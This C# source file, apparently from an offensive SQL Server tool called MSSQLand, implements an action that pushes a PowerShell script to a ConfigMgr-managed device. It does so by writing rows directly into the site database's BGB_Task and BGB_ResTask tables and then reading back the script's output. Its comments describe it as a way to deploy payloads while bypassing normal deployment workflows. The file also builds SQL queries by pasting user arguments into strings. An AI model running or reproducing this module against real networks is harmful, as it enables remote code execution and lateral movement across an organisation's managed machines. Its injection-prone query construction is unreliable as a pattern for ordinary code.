using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Data;
using System.Text;
using System.Threading;

namespace MSSQLand.Actions.ConfigMgr
{
    /// <summary>
    /// Execute a PowerShell script on a target device through ConfigMgr's Background (BGB) notification channel.
    /// Use this to run commands or deploy payloads on managed devices using ConfigMgr's legitimate script execution.
    /// Requires script GUID (from sccm-scripts or sccm-script-add) and target ResourceID (from sccm-devices).
    /// Creates BGB task entries to push script execution notification to online clients.
    /// Returns Task ID for monitoring execution status with sccm-script-status.
    /// Target device must be online with active BGB channel for immediate execution.
    /// Bypasses traditional package deployment workflows - executes directly via client notification.
    /// </summary>
    internal class CMScriptRun : BaseAction
    {
        [ArgumentMetadata(Position = 0, ShortName = "r", LongName = "resourceid", Description = "Target device ResourceID", Required = true)]
        private string _resourceId;

        [ArgumentMetadata(Position = 1, ShortName = "g", LongName = "scriptguid", Description = "Script GUID to execute", Required = true)]
        private string _scriptGuid;

        public override void ValidateArguments(string[] args)
        {
            var (named, positional) = ParseActionArguments(args);

            // ResourceID argument (required)
            _resourceId = GetNamedArgument(named, "r", null)
                       ?? GetNamedArgument(named, "resourceid", null)
                       ?? GetPositionalArgument(positional, 0);

            if (string.IsNullOrWhiteSpace(_resourceId))
            {
                throw new ArgumentException("ResourceID is required (--resourceid or -r)");
            }

            // Script GUID argument (required)
            _scriptGuid = GetNamedArgument(named, "g", null)
                       ?? GetNamedArgument(named, "scriptguid", null)
                       ?? GetPositionalArgument(positional, 1);

            if (string.IsNullOrWhiteSpace(_scriptGuid))
            {
                throw new ArgumentException("Script GUID is required (--scriptguid or -g)");
            }
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Executing ConfigMgr script on ResourceID: {_resourceId}");

            CMService sccmService = new(databaseContext.QueryService, databaseContext.Server);

            var databases = sccmService.GetSccmDatabases();

            if (databases.Count == 0)
            {
                Logger.Warning("No ConfigMgr databases found");
                return null;
            }

            foreach (string db in databases)
            {
                string siteCode = CMService.GetSiteCode(db);
                Logger.Info($"ConfigMgr database: {db} (Site Code: {siteCode})");

                try
                {
                    // Step 1: Verify script exists and get metadata
                    string scriptQuery = $@"
SELECT ScriptHash, ScriptVersion, ScriptName 
FROM [{db}].dbo.Scripts 
WHERE ScriptGuid = '{_scriptGuid}'";

                    DataTable scriptInfo = databaseContext.QueryService.ExecuteTable(scriptQuery);

                    if (scriptInfo.Rows.Count == 0)
                    {
                        Logger.Error($"Script not found: {_scriptGuid}");
                        continue;
                    }

                    string scriptHash = scriptInfo.Rows[0]["ScriptHash"].ToString();
                    int scriptVersion = Convert.ToInt32(scriptInfo.Rows[0]["ScriptVersion"]);
                    string scriptName = scriptInfo.Rows[0]["ScriptName"].ToString();

                    Logger.InfoNested($"Script: {scriptName}");
                    Logger.InfoNested($"Version: {scriptVersion}");

                    // Step 2: Verify target device exists and is online
                    string deviceQuery = $@"
SELECT Name0, OnlineStatus, LastOnlineTime 
FROM [{db}].dbo.v_R_System sys
LEFT JOIN [{db}].dbo.BGB_ResStatus bgb ON sys.ResourceID = bgb.ResourceID
WHERE sys.ResourceID = {_resourceId}";

                    DataTable deviceInfo = databaseContext.QueryService.ExecuteTable(deviceQuery);

                    if (deviceInfo.Rows.Count == 0)
                    {
                        Logger.Error($"Device not found: ResourceID {_resourceId}");
                        continue;
                    }

                    string deviceName = deviceInfo.Rows[0]["Name0"]?.ToString() ?? "Unknown";
                    Logger.InfoNested($"Target device: {deviceName}");

                    // Step 3: Create TaskParam XML
                    string taskParam = $@"<ScriptContent ScriptGuid='{_scriptGuid}'><ScriptVersion>{scriptVersion}</ScriptVersion><ScriptType>0</ScriptType><ScriptHash ScriptHashAlg='SHA256'>{scriptHash}</ScriptHash><ScriptParameters></ScriptParameters><ParameterGroupHash ParameterHashAlg='SHA256'></ParameterGroupHash></ScriptContent>";
                    string taskParamBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(taskParam));

                    // Generate task GUID
                    string taskGuid = Guid.NewGuid().ToString().ToUpper();

                    // Step 4: Insert into BGB_Task
                    string insertTaskQuery = $@"
INSERT INTO [{db}].dbo.BGB_Task 
(TemplateID, CreateTime, Signature, GUID, Param) 
VALUES 
(15, '', NULL, '{taskGuid}', '{taskParamBase64}')";

                    databaseContext.QueryService.ExecuteNonProcessing(insertTaskQuery);
                    Logger.Success("Created BGB_Task entry");
                    Logger.InfoNested($"Task GUID: {taskGuid}");

                    // Step 5: Get TaskID
                    string getTaskIdQuery = $@"
SELECT TaskID FROM [{db}].dbo.BGB_Task 
WHERE GUID = '{taskGuid}'";

                    DataTable taskIdResult = databaseContext.QueryService.ExecuteTable(getTaskIdQuery);
                    int taskId = Convert.ToInt32(taskIdResult.Rows[0]["TaskID"]);
                    Logger.InfoNested($"Task ID: {taskId}");

                    // Step 6: Insert into BGB_ResTask (triggers push notification)
                    string insertResTaskQuery = $@"
INSERT INTO [{db}].dbo.BGB_ResTask 
(ResourceID, TemplateID, TaskID, Param) 
VALUES 
({_resourceId}, 15, {taskId}, N'')";

                    databaseContext.QueryService.ExecuteNonProcessing(insertResTaskQuery);
                    Logger.Success("Task pushed to device");

                    // Step 7: Check status after brief delay
                    Logger.TaskNested("Checking execution status...");
                    Thread.Sleep(2000); // Wait 2 seconds for execution

                    string outputQuery = $@"
SELECT ScriptExecutionState, ScriptExitCode, ScriptOutput 
FROM [{db}].dbo.ScriptsExecutionStatus 
WHERE TaskID = {taskId}";

                    DataTable outputResult = databaseContext.QueryService.ExecuteTable(outputQuery);

                    if (outputResult.Rows.Count > 0)
                    {
                        int exitCode = Convert.ToInt32(outputResult.Rows[0]["ScriptExitCode"]);
                        string scriptOutput = outputResult.Rows[0]["ScriptOutput"]?.ToString() ?? string.Empty;

                        Logger.NewLine();
                        Logger.Success($"Script execution completed (Exit Code: {exitCode})");
                        Logger.TaskNested("Script Output");
                        Logger.NewLine();

                        if (!string.IsNullOrEmpty(scriptOutput))
                        {
                            try
                            {
                                // Try to parse as JSON array (simple parsing for .NET 4.8)
                                if (scriptOutput.StartsWith("[") && scriptOutput.EndsWith("]"))
                                {
                                    string cleaned = scriptOutput.Trim('[', ']').Replace("\\\\", "\\").Replace("\\\"", "\"");
                                    string[] lines = cleaned.Split(new[] { "\",\"" }, StringSplitOptions.RemoveEmptyEntries);
                                    foreach (var line in lines)
                                    {
                                        Console.WriteLine(line.Trim('\"'));
                                    }
                                }
                                else
                                {
                                    Console.WriteLine(scriptOutput);
                                }
                            }
                            catch
                            {
                                // Raw output
                                Console.WriteLine(scriptOutput);
                            }
                        }
                        else
                        {
                            Logger.Warning("No output received");
                        }
                    }
                    else
                    {
                        Logger.Warning("Script is still executing or waiting in queue");
                        Logger.InfoNested($"Use 'sccm-script-status --taskid {taskId}' to check status");
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error($"Failed to execute script: {ex.Message}");
                }
            }

            return null;
        }
    }
}
